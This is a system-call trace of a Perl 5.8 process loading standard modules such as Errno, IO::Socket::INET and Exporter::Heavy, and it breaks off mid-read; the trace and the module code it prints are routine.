12010 20:22:35.452799 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
12010 20:22:35.452891 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
12010 20:22:35.452910 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d5b000
12010 20:22:35.452925 mmap2(0xb7d60000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d60000
12010 20:22:35.452942 close(8)          = 0
12010 20:22:35.453617 brk(0x825a000)    = 0x825a000
12010 20:22:35.453787 stat64("/etc/perl/Errno.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.453805 stat64("/etc/perl/Errno.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.453819 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.453833 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.453847 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.453860 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.453879 stat64("/usr/lib/perl5/Errno.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.453892 stat64("/usr/lib/perl5/Errno.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.453906 stat64("/usr/share/perl5/Errno.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.453918 stat64("/usr/share/perl5/Errno.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.453932 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.453945 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
12010 20:22:35.453967 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
12010 20:22:35.454024 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79a38) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.454037 _llseek(8, 0, [0], SEEK_CUR) = 0
12010 20:22:35.454074 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
12010 20:22:35.454849 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
12010 20:22:35.455267 _llseek(8, 5966, [5966], SEEK_SET) = 0
12010 20:22:35.455285 _llseek(8, 0, [5966], SEEK_CUR) = 0
12010 20:22:35.455296 close(8)          = 0
12010 20:22:35.455696 brk(0x827b000)    = 0x827b000
12010 20:22:35.455826 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
12010 20:22:35.456325 _llseek(6, 6698, [6698], SEEK_SET) = 0
12010 20:22:35.456342 _llseek(6, 0, [6698], SEEK_CUR) = 0
12010 20:22:35.456353 close(6)          = 0
12010 20:22:35.456373 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.456399 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.456442 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.456472 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.456487 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.456501 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.456516 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.456529 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.456544 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.456570 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.456584 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.456599 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
12010 20:22:35.456621 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
12010 20:22:35.456637 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79ee8) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.456649 _llseek(6, 0, [0], SEEK_CUR) = 0
12010 20:22:35.456667 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
12010 20:22:35.457048 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.457065 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.457079 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.457093 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.457108 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.457121 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.457136 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.457149 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.457163 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.457175 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.457190 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.457203 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.457217 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.457232 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
12010 20:22:35.457254 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
12010 20:22:35.457269 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79a38) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.457280 _llseek(8, 0, [0], SEEK_CUR) = 0
12010 20:22:35.457298 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x 